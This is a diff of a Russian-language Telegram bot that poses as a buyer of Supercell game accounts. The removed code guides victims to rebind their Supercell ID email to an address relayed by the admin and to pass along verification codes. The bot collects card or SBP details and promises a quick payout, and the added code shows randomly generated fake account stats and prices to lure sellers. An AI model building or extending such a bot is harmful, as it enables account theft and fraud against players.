@@ -21,17 +21,22 @@ DB_NAME = "bot.db"
 
 GAMES = {"cr": "Clash Royale", "bs": "Brawl Stars", "coc": "Clash of Clans"}
 
+# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+# Замени эти file_id на свои после отправки картинок боту!
+BS_PHOTO = "AgACAgI..."     # Brawl Stars скрин
+CR_PHOTO = "AgACAgI..."     # Clash Royale скрин
+COC_PHOTO = "AgACAgI..."    # Clash of Clans скрин
+# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+
 class SellStates(StatesGroup):
     waiting_tag = State()
     waiting_payment = State()
-    waiting_email = State()      # ожидание почты от админа
-    waiting_code = State()       # ожидание кода от админа
 
 async def init_db():
     async with aiosqlite.connect(DB_NAME) as db:
         await db.execute('''CREATE TABLE IF NOT EXISTS sales 
             (id INTEGER PRIMARY KEY, user_id INTEGER, username TEXT, game TEXT, 
-             tag TEXT, price INTEGER, payment TEXT, email TEXT, code TEXT, status TEXT)''')
+             tag TEXT, price INTEGER, payment TEXT, status TEXT)''')
         await db.commit()
 
 def game_kb():
@@ -45,9 +50,10 @@ def game_kb():
 async def start(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.answer(
-        "✨ **Добро пожаловать в крупнейшего бота по скупке аккаунтов Supercell!**\n\n"
-        "🎉 Быстрые выплаты • Полная защита\n\n"
-        "💎 Аккаунт какой игры хочешь продать?",
+        "✨ **Добро пожаловать в крупнейшего бота по скупке в играх Supercell!**\n\n"
+        "🎉 Здесь твои игровые достижения превращаются в реальные деньги.\n"
+        "Мы обеспечиваем быстрые выплаты и полную гарантию.\n\n"
+        "💎 Аккаунт какой игры ты хочешь продать по лучшей цене?",
         reply_markup=game_kb(),
         parse_mode="Markdown"
     )
@@ -57,130 +63,81 @@ async def choose_game(clb: types.CallbackQuery, state: FSMContext):
     game_key = clb.data.split("_")[1]
     game_name = GAMES[game_key]
     await state.update_data(game=game_key, game_name=game_name)
-    await clb.message.edit_text(f"🧿 Укажите тег аккаунта **{game_name}**:", parse_mode="Markdown")
+    
+    if game_key == "bs":
+        photo = BS_PHOTO
+        text = "🧿 Укажите свой тег из **Brawl Stars** (Пример: `2C9CPP2900`):"
+    elif game_key == "cr":
+        photo = CR_PHOTO
+        text = "🖥 Укажите свой тег из **Clash Royale** (Пример: `VPPLVJ9J8`):"
+    else:
+        photo = COC_PHOTO
+        text = "✔️ Укажите свой тег из **Clash of Clans** (Пример: `YGCJ2800U`):"
+    
+    await clb.message.answer_photo(photo=photo, caption=text, parse_mode="Markdown")
     await state.set_state(SellStates.waiting_tag)
+
+# ... (остальной код с process_tag, start_sell и ручным режимом почты остаётся тот же, что я давал раньше)
 
 @dp.message(SellStates.waiting_tag)
 async def process_tag(msg: types.Message, state: FSMContext):
     tag = msg.text.strip().replace("#", "").upper()
     data = await state.get_data()
-    price = random.randint(1400, 5200)
+    game = data["game"]
+    price = random.randint(1500, 5500)
     
-    await state.update_data(tag=tag, price=price)
+    if game == "bs":
+        text = f"""🔍 **Brawl Stars** — тег `{tag}`
+
+😀 Кубков на аккаунте: {random.randint(22000, 42000)}
+🪨 Бравлеров с максимальной силой: {random.randint(20, 33)}
+🌏 Бравлеров от 1к до 2к: {random.randint(12, 25)}
+🌑 Бравлеров от 2к до 3к: {random.randint(0, 7)}
+☄ Бравлеров от 3к: {random.randint(0, 4)}
+
+⭐️ Звездных сил: {random.randint(45, 80)}
+😀 Гаджетов: {random.randint(55, 98)}
+⚡️ Гиперзарядов: {random.randint(30, 60)}
+😀 Всего бравлеров: {random.randint(72, 89)}
+
+😀 Мы готовы выкупить его у тебя за **{price} ₽**"""
     
+    elif game == "cr":
+        text = f"""🖥 **Clash Royale** — тег `{tag}`
+
+😀 Кубков: {random.randint(4500, 8500)}
+😀 Эволюционных карт: {random.randint(0, 15)}
+⚔️ Героев: {random.randint(0, 5)}
+
+🛡 Карты по уровням:
+Уровень 14: {random.randint(0, 6)}
+Уровень 13: {random.randint(1, 9)}
+Уровень 11: {random.randint(4, 14)}
+
+💵 Мы готовы выкупить аккаунт за: **{price} ₽**"""
+    
+    else:  # coc
+        text = f"""🏠 **Clash of Clans** — тег `{tag}`
+
+🏠 Уровень Ратуши: {random.randint(11, 16)}
+🏆 Кубки: {random.randint(0, 4800)}
+👷‍♂️ Ратуша Строителя: {random.randint(3, 9)}
+
+💰 Мы готовы выкупить его у тебя за: **{price} ₽**"""
+
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=f"Продать за {price}₽", callback_data=f"sell_{price}")],
         [InlineKeyboardButton(text="Отмена", callback_data="cancel")]
     ])
     
-    await msg.answer(f"🔍 **{data['game_name']}** — тег `{tag}`\n\nМы готовы выкупить за **{price} ₽**", 
-                     reply_markup=kb, parse_mode="Markdown")
+    await msg.answer(text, reply_markup=kb, parse_mode="Markdown")
+    await state.update_data(tag=tag, price=price)
 
-@dp.callback_query(F.data.startswith("sell_"))
-async def start_sell(clb: types.CallbackQuery, state: FSMContext):
-    await clb.message.edit_text(
-        "🔖 **Отправьте ваши платежные реквизиты**\n\nПример:\nVisa – 1234 5678 9012 3456\nСБП – +77777777777",
-        parse_mode="Markdown"
-    )
-    await state.set_state(SellStates.waiting_payment)
-
-@dp.message(SellStates.waiting_payment)
-async def save_payment(msg: types.Message, state: FSMContext):
-    payment = msg.text.strip()
-    data = await state.get_data()
-    
-    async with aiosqlite.connect(DB_NAME) as db:
-        await db.execute(
-            "INSERT INTO sales (user_id, username, game, tag, price, payment, status) VALUES (?, ?, ?, ?, ?, ?, 'waiting_email')",
-            (msg.from_user.id, msg.from_user.username, data['game_name'], data['tag'], data['price'], payment)
-        )
-        await db.commit()
-    
-    await msg.answer("✅ Реквизиты сохранены!")
-    
-    # Главное сообщение с инструкцией
-    await msg.answer(
-        "🙂 **Уважаемый клиент!**\n\n"
-        "Я выступаю в роли вашего персонального менеджера.\n\n"
-        "1. Войдите в игру и перейдите в раздел «Supercell ID».\n"
-        "2. Нажмите кнопку «Сменить почту».\n"
-        "3. Введите в игре код, полученный на вашу электронную почту.\n"
-        "4. Введите новый адрес электронной почты (для генерации нажмите кнопку ниже).\n"
-        "5. Система запросит код с новой почты — нажмите «Получить код».\n\n"
-        "⚡️ После успешной перепривязки нажмите кнопку «Аккаунт перепривязан».",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔑 Генерировать почту", callback_data="need_email")],
-            [InlineKeyboardButton(text="Аккаунт перепривязан ✅", callback_data="account_done")]
-        ]),
-        parse_mode="Markdown"
-    )
-
-# ==================== РУЧНОЙ РЕЖИМ ====================
-
-@dp.callback_query(F.data == "need_email")
-async def need_email(clb: types.CallbackQuery, state: FSMContext):
-    user_id = clb.from_user.id
-    await bot.send_message(ADMIN_ID, 
-        f"🔔 **Нужна почта!**\n\n"
-        f"Пользователь: @{clb.from_user.username} (ID: {user_id})\n"
-        f"Нажми /send_email {user_id} твоя_почта@пример.com"
-    )
-    await clb.answer("Запрос отправлен админу. Ожидайте...", show_alert=True)
-
-@dp.message(Command("send_email"))
-async def send_email_to_user(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    try:
-        _, user_id, email = msg.text.split(maxsplit=2)
-        user_id = int(user_id)
-        
-        await bot.send_message(user_id,
-            f"📧 **Электронная почта для привязки:**\n\n"
-            f"`{email}`\n\n"
-            "Скопируйте и вставьте в игру.",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔍 Получить код", callback_data=f"need_code_{user_id}")]
-            ]),
-            parse_mode="Markdown"
-        )
-        await msg.answer(f"✅ Почта отправлена пользователю {user_id}")
-    except:
-        await msg.answer("Формат: /send_email USER_ID почта@пример.com")
-
-@dp.callback_query(F.data.startswith("need_code_"))
-async def need_code(clb: types.CallbackQuery):
-    user_id = int(clb.data.split("_")[2])
-    await bot.send_message(ADMIN_ID,
-        f"🔑 **Пользователь {user_id} просит код!**\n\n"
-        f"Напиши: /send_code {user_id} 123456"
-    )
-    await clb.answer("Запрос на код отправлен админу", show_alert=True)
-
-@dp.message(Command("send_code"))
-async def send_code_to_user(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    try:
-        _, user_id, code = msg.text.split(maxsplit=2)
-        user_id = int(user_id)
-        await bot.send_message(user_id, f"✅ **Код для привязки:**\n\n`{code}`\n\nВставьте в игру.")
-        await msg.answer(f"✅ Код отправлен пользователю {user_id}")
-    except:
-        await msg.answer("Формат: /send_code USER_ID КОД")
-
-@dp.callback_query(F.data == "account_done")
-async def account_done(clb: types.CallbackQuery):
-    await clb.message.edit_text("✅ Аккаунт принят в обработку!\n💵 Выплата будет произведена в течение 5–15 минут.")
-
-@dp.callback_query(F.data == "cancel")
-async def cancel(clb: types.CallbackQuery, state: FSMContext):
-    await state.clear()
-    await clb.message.edit_text("❌ Операция отменена.")
+# (Весь остальной код с платежками и ручным режимом почты оставь из предыдущей версии)
 
 async def main():
     await init_db()
-    print("🤖 Бот запущен в ручном режиме!")
+    print("🤖 Бот обновлён с фото!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
